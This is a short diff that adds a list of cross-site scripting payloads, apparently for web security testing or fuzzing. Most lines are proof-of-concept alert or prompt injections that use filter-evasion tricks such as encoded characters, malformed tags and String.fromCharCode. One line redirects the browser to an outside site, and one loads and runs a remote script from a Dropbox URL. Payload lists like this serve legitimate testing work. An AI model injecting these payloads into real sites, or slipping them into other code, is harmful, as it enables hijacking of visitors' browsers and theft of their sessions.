@@ -1,0 +1,10 @@
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<script>window.location.href = "http://www.w3schools.com";</script>
+<script>alert('XSS')</script>
+<script>prompt('XSS')</script>
+<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+<script ~~~>alert(0%0)</script ~~~>
+<%<!--'%><script>alert(1);</script -->
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<img src=`xx:xx`><script>onerror=alert(1)</script>
+"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
